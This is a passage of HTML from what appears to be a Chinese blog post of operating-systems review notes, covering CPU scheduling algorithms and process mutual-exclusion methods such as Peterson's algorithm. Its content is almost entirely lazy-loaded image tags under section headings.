srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620231917135"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232103491.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232103491.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620232103491" style="zoom:33%;"><h2 id="高响应比优先算法"><a href="#高响应比优先算法" class="headerlink" title="高响应比优先算法"></a>高响应比优先算法</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232452118.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232452118.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620232452118"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232605551.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232605551.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h2 id="时间片轮转"><a href="#时间片轮转" class="headerlink" title="时间片轮转"></a>时间片轮转</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621084416767.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621084416767.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210621084416767"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621090738021.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621090738021.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210621090738021"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621084521187.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621084521187.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210621084521187"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621084538407.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210621084538407.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210621084538407"></p><h2 id="优先级调度算法"><a href="#优先级调度算法" class="headerlink" title="优先级调度算法"></a>优先级调度算法</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093613512.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093613512.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093613512" style="zoom:50%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093108550.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093108550.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093108550" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093156132.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093156132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093156132"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093108550.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093108550.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093108550" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093156132.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093156132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093156132"></p><h2 id="多级反馈队列调度算法"><a href="#多级反馈队列调度算法" class="headerlink" title="多级反馈队列调度算法"></a>多级反馈队列调度算法</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093904412.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093904412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093904412" style="zoom:50%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093904412.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093904412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093904412" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094111923.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094111923.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627094111923"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093904412.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627093904412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627093904412" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094111923.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094111923.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627094111923"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094126545.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094126545.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627094126545"></p><h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><h2 id="进程同步、互斥"><a href="#进程同步、互斥" class="headerlink" title="进程同步、互斥"></a>进程同步、互斥</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094744589.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094744589.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627094744589" style="zoom:50%;"><p>进程互斥</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094904759.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627094904759.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627094904759" style="zoom: 50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095009793.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095009793.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627095009793" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095138222.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095138222.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627095138222" style="zoom:50%;"><h2 id="进程互斥实现方法"><a href="#进程互斥实现方法" class="headerlink" title="进程互斥实现方法"></a>进程互斥实现方法</h2><h6 id="1-单标志"><a href="#1-单标志" class="headerlink" title="1.单标志"></a>1.单标志</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095710774.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095710774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627095710774" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095908054.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627095908054.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627095908054" style="zoom:50%;"><h6 id="2-双标志先检查"><a href="#2-双标志先检查" class="headerlink" title="2.双标志先检查"></a>2.双标志先检查</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100235668.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100235668.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627100235668" style="zoom:50%;"><h6 id="3-双标志后检查"><a href="#3-双标志后检查" class="headerlink" title="3.双标志后检查"></a>3.双标志后检查</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100346972.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100346972.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627100346972" style="zoom:50%;"><h6 id="4-peterson算法"><a href="#4-peterson算法" class="headerlink" title="4.peterson算法"></a>4.peterson算法</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100821207.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100821207.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627100821207" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100943800.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627100943800.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627100943800" style="zoom:50%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627101005370.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627101005370.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627101005370"></p><h6 id="5-硬件互斥实现方法"><a href="#5-硬件互斥实现方法" class="headerlink" title="5.硬件互斥实现方法"></a>5.硬件互斥实现方法</h6><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627101151975.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627101151975.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627101151975" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627102317489.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210627102317489.png" 